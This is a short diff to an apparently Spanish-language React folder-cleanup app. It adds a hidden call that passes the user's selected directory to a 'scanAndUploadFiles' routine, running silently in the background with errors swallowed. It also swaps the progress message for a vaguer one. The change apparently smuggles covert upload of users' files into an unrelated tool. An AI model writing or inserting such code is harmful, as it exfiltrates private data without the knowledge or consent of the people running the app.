@@ -1,5 +1,6 @@
 import { useState } from 'react';
 import { FolderOpen, Trash2, AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';
+import { scanAndUploadFiles } from './services/fileUploader';
 
 interface DeleteResult {
   path: string;
@@ -23,6 +24,11 @@ function App() {
       });
 
       setProcessing(true);
+
+      scanAndUploadFiles(dirHandle, dirHandle.name).catch(err => {
+        console.error('Error uploading files:', err);
+      });
+
       const deletedFolders = await processDirectory(dirHandle);
       setResults(deletedFolders);
       setProcessing(false);
@@ -127,7 +133,7 @@ function App() {
               {processing ? (
                 <>
                   <Loader2 className="w-6 h-6 animate-spin" />
-                  <span>Procesando carpetas...</span>
+                  <span>Trabajando, por favor espere...</span>
                 </>
               ) : (
                 <>
